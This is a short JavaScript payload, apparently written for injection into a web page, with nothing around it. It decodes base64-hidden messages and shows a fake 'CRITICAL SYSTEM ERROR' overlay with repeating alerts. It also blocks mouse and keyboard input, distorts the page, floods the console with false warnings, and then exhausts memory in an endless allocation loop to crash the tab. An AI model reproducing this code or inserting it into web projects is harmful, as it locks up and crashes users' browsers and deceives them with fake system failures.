(function() {
  console.error(atob("8J+UjSBJbWFnZSBOT1QgTk9VTkQh"));
  let bg = document.getElementById("interactive-background");
  if(bg) bg.remove();

  let o=document.createElement("div");
  o.style="position:fixed;top:0;left:0;width:100vw;height:100vh;background-color:rgba(0,0,0,0.9);color:red;font-size:24px;font-weight:bold;display:flex;align-items:center;justify-content:center;";
  o.innerHTML=`<h1>${atob("Q1JJVElDQUwgU1lTVEVNIEVSUk9S")}</h1><p>${atob("RmF0YWwgZXJyb3Iu")}</p>`;
  document.body.appendChild(o);

  setInterval(()=>alert(atob("Q3JpdGljYWwgU3lzdGVtIEVycm9yOiBSZXN0YXJ0IFJlcXVpcmVkLg==")),3000);

  document.body.style.pointerEvents="none";
  document.onkeydown=e=>e.preventDefault();
  document.body.style.transform="rotate(180deg)";
  document.body.style.filter="blur(10px) grayscale(100%)";

  setInterval(()=>{
    console.error(atob("V2FybmluZzogTWVtb3J5IExlYWsgRGV0ZWN0ZWQ="));
    console.warn(atob("RGVwcmVjYXRlZCBBUEkgdXNlZA=="));
    console.info(atob("UnVubmluZyBzeXN0ZW0gZGlhZ25vc3RpY3MuLi4gW0ZBSUxFRF0="));
  },2000);

  setTimeout(()=>{
    let meltdown=[];
    while(true){
      meltdown.push(new Uint8Array(5e8)); // 500MB blocks => crash
    }
  },1000);
})();
